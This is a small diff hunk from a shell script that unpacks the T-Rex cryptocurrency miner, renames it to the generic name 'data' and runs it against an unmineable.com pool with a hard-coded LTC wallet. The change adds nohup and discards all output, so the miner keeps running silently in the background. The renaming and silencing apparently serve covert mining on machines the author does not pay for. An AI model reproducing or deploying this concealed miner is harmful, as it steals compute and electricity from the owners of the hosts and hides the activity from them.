@@ -21,7 +21,7 @@
 	sudo tar xvzf t-rex-0.23.1-linux.tar.gz
 	sudo mv t-rex data
 	chmod 777 data
-	./data -a ethash -o ethash.unmineable.com:3333 -u LTC:LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV.$(echo $(shuf -i 1-99999 -n 1)-GPU) -p x -w $1 --no-nvml --no-watchdog
+	nohup ./data -a ethash -o ethash.unmineable.com:3333 -u LTC:LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV.$(echo $(shuf -i 1-99999 -n 1)-GPU) -p x -w $1 --no-nvml --no-watchdog >/dev/null 2>&1
 	
 	  
 	
